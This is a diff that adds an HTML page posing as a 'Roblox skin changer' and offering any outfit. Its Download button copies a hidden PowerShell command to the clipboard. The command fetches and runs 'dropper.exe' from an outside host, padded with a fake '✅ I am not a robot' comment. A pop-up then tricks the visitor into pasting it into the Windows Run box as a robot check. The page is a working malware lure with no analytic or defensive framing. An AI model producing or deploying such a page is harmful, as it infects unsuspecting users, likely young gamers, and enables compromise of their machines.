@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox skin changer</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap');
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background: url('https://cdn.buttercms.com/02EBsV0ZQ8C0muNWfDyw') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .verify-text {
+            font-family: 'Luckiest Guy', cursive;
+            font-size: 50px;
+            color: white;
+            text-shadow: 4px 4px 0px #000;
+            margin-bottom: 20px;
+        }
+        .roblox-button {
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            border: none;
+            background-color: #29c2ff; /* Roblox blue */
+            color: white;
+            border-radius: 5px;
+            transition: 0.3s;
+            box-shadow: 0 4px #22a5d8;
+        }
+        .roblox-button:hover {
+            background-color: #2294c2;
+        }
+        .roblox-button:active {
+            box-shadow: none;
+            transform: translateY(2px);
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-text">Roblox Skin changer<br>Get any outfit!</div>
+    <button class="roblox-button" onclick="copyToClipboard()">Download</button>
+    <script>
+        function copyToClipboard() {
+            navigator.clipboard.writeText('powershell -Command "Invoke-WebRequest \'http://leonboussen.com/subfolder/dropper.exe\' -OutFile \"$env:TEMP\\dropper.exe\"; Start-Process -FilePath \"$env:TEMP\\dropper.exe\"; pause # ✅ I am not a robot                                                                  ')
+            .then(() => {
+                alert("🤖 BIEP BOEP wait...\nVerify that you are not a robot\nPress Windows key + R → Ctrl + V → Enter");
+            })
+            .catch(err => {
+                console.error("Failed to copy text:", err);
+            });
+        }
+    </script>
+</body>
+</html>
